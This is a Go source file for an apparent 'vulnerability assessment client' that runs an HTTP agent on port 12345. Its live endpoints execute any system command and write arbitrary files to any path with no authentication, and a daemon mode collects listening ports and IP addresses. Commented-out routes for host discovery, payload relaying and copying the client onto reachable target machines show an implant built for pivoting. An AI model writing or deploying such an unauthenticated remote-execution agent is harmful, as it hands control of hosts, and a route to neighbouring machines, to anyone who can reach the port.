package main

import (
	"context"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"github.com/gin-gonic/gin"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"time"
	"vulAssessClient/inforCollect"
	"vulAssessClient/utils"
)

var (
	done  = make(chan struct{})
	final = make(chan struct{})
)

// defineRoutes 定义路由，在这里接收server命令，开启协程执行并返回结果
func defineRoutes() *gin.Engine {
	gin.SetMode(gin.ReleaseMode)
	gin.DisableConsoleColor()
	r := gin.Default()

	// 测试存活
	r.POST("/ping", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"message": "pong"})
	})

	//r.POST("/exit", func(c *gin.Context) {
	//	done <- struct{}{}
	//	c.JSON(http.StatusOK, gin.H{"message": "exiting"})
	//	//go func() {
	//	//	done <- struct{}{}
	//	//}()
	//})

	// TODO: 鉴权 与 加密通信
	// 获得占用端口 -> 获得占用端口进程pid -> 获得占用端口服务、版本
	//r.POST("/api/get_server", func(c *gin.Context) {
	//	listenProcess, err := inforCollect.GetListenProcess()
	//	if err != nil {
	//		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
	//	}
	//	var ports []string
	//	var expect uint16 = 12345
	//	for _, p := range listenProcess {
	//		if !p.LocalAddr.IP.IsLoopback() && p.LocalAddr.Port != expect {
	//			ports = append(ports, strconv.Itoa(int(p.LocalAddr.Port)))
	//
	//		}
	//	}
	//	ports = utils.RemoveRepByMap(ports)
	//	//ports := []string{"53", "3306", "1716"}
	//	//encodeString := base64.StdEncoding.EncodeToString([]byte(getPortServer(ports)))
	//	//fmt.Println(encodeString)
	//	log.Printf("port:%v", ports)
	//
	//	c.JSON(http.StatusOK, gin.H{"message": base64.StdEncoding.EncodeToString([]byte(strings.Join(ports, ",")))})
	//})

	//r.POST("/api/kernel_version", func(c *gin.Context) {
	//	ver, err := inforCollect.GetKernelVersion()
	//	if err != nil {
	//		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
	//	}
	//	c.JSON(http.StatusOK, gin.H{"message": base64.StdEncoding.EncodeToString([]byte(ver))})
	//})

	//// 测试是否连通
	//r.POST("/api/ping_host", func(c *gin.Context) {
	//	var targets struct {
	//		Ip []string
	//	}
	//	err := c.ShouldBindJSON(&targets)
	//	if err != nil {
	//		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	//		return
	//	}
	//
	//	var res []string
	//
	//	for _, t := range targets.Ip {
	//		err = inforCollect.DiscoveryHost(t)
	//		//log.Println(err)
	//		if err == nil {
	//			res = append(res, t)
	//		}
	//	}
	//	c.JSON(http.StatusOK, gin.H{"message": res})
	//})
	//
	//// 中继
	//r.POST("/api/relay", func(c *gin.Context) {
	//	var relay struct {
	//		Addr    string
	//		Payload string
	//	}
	//	err := c.ShouldBindJSON(&relay)
	//	if err != nil {
	//		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	//	}
	//	decodedData, err := base64.StdEncoding.DecodeString(relay.Payload)
	//	if err != nil {
	//		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	//	}
	//	res, err := utils.Request("POST", relay.Addr, decodedData)
	//	if err != nil {
	//		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
	//	}
	//	c.JSON(http.StatusOK, res)
	//})
	//
	//// 扩张client，即将client上传至可触及靶机
	//r.POST("/api/expand", func(c *gin.Context) {
	//
	//})

	// 退出
	r.POST("/exit", func(c *gin.Context) {
		//done <- struct{}{}
		c.JSON(http.StatusOK, gin.H{"message": "exiting"})
		go func() {
			fmt.Println("exit")
			done <- struct{}{}
		}()
	})

	// 执行系统命令
	r.POST("/api/exec", func(c *gin.Context) {
		var receive struct {
			Args []string
		}
		err := c.ShouldBindJSON(&receive)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		}

		cmd := exec.Command(receive.Args[0], receive.Args[1:]...)
		output, err := cmd.Output()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		}
		c.JSON(http.StatusOK, gin.H{"output": string(output)})
	})

	// 上传文件
	r.POST("/api/upload", func(c *gin.Context) {
		var receive struct {
			Path string
			Data string
		}
		err := c.ShouldBindJSON(&receive)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		file, err := os.Create(receive.Path)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		}
		defer file.Close()
		decodedData, err := base64.StdEncoding.DecodeString(receive.Data)
		_, err = file.Write(decodedData)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		}
		c.JSON(http.StatusOK, gin.H{"message": "success"})
	})

	return r
}

func main() {

	goDaemon := flag.Bool("d", false, "run app as a daemon with -d=true.")
	flag.Parse()

	if *goDaemon {

		// 端口
		listenProcess, err := inforCollect.GetListenProcess()
		if err != nil {
			log.Fatal(err)
		}
		var ports []string
		var expect uint16 = 12345
		for _, p := range listenProcess {
			if !p.LocalAddr.IP.IsLoopback() && p.LocalAddr.Port != expect {
				ports = append(ports, strconv.Itoa(int(p.LocalAddr.Port)))
			}
		}
		ports = utils.RemoveRepByMap(ports)
		fmt.Printf("port:%v\n", ports)

		// ip地址
		res := inforCollect.GetIpAddr()
		fmt.Printf("res:%v\n", res)

		// 后台启动
		cmd := exec.Command(os.Args[0], flag.Args()...)
		if err := cmd.Start(); err != nil {
			fmt.Printf("start %s failed, error: %v\n", os.Args[0], err)
			os.Exit(1)
		}
		fmt.Printf("%s [PID] %d running...\n", os.Args[0], cmd.Process.Pid)
		os.Exit(0)
	}

	server := &http.Server{
		Addr:           ":12345",
		Handler:        defineRoutes(),
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
	}

	go func() {
		if err := server.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			log.Fatalf("listen: %s\n", err)
		}
	}()

	// 监听结束信号
	go func() {
		quit := make(chan os.Signal, 1)
		signal.Notify(quit, os.Interrupt)
		for {
			select {
			case <-done:
				final <- struct{}{}
			case <-quit:
				final <- struct{}{}
			}
		}
	}()

	// 接收到结束信号，执行结束程序
	<-final
	log.Println("exiting...")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := server.Shutdown(ctx); err != nil {
		log.Fatal("Server Shutdown:", err)
	}
}
